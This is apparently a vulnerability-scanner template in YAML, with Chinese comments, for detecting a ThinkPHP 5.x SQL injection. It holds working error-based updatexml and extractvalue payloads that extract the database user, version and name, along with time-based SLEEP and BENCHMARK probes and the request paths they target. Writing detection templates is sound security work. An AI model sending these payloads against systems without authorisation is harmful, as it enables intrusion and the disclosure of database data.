id: thinkphp-sqli
info:
  name: ThinkPHP SQL Injection (updatexml)
  severity: Critical
  description: |
    检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞，利用 updatexml 函数进行报错注入。
    该漏洞通常存在于数组参数的 SQL 查询中。
  tags:
    - sqli
    - thinkphp
    - updatexml
  reference:
    - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/

# 定义针对不同策略的 Payload 集合
payload_sets:
  default:
    - "0,updatexml(0,concat(0xa,user()),0)"
    - "0,updatexml(0,concat(0xa,version()),0)"
    - "0,extractvalue(1,concat(0xa,user()))"
  aggressive:
    - "0,updatexml(0,concat(0xa,user()),0)"
    - "0,updatexml(0,concat(0xa,version()),0)"
    - "0,updatexml(0,concat(0xa,database()),0)"
    - "0,extractvalue(1,concat(0xa,user()))"
    - "0,extractvalue(1,concat(0xa,version()))"

requests:
  # 测试1: 数组参数注入 (TP5 典型漏洞)
  - method: GET
    preconditions:
      requires_tech: [thinkphp]
    path:
      - "{{BaseURL}}/index.php?ids[{{payload}}]=1"
      - "{{BaseURL}}/?s=index/index/index&ids[{{payload}}]=1"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "syntax error"
          - "SQLSTATE"
        condition: or
        part: body
      - type: status
        status: [500]

  # 测试2: 通用 SQL 探测 (防止路径识别失败)
  - method: GET
    preconditions:
      requires_tech: [thinkphp]
    path:
      - "{{BaseURL}}/index.php?id={{payload}}"
      - "{{BaseURL}}/?s=index/index/index&id={{payload}}"
    matchers-condition: and
    matchers:
      - type: status
        status: [500]
      - type: word
        words:
          - "XPATH syntax error"
        part: body

  # 测试3: 时间盲注探测
  - method: GET
    preconditions:
      requires_tech: [thinkphp]
    path:
      - "{{BaseURL}}/index.php?ids[SLEEP(3)]=1"
      - "{{BaseURL}}/index.php?ids[BENCHMARK(5000000,SHA1('test'))]=1"
    matchers:
      - type: status
        status: [200]
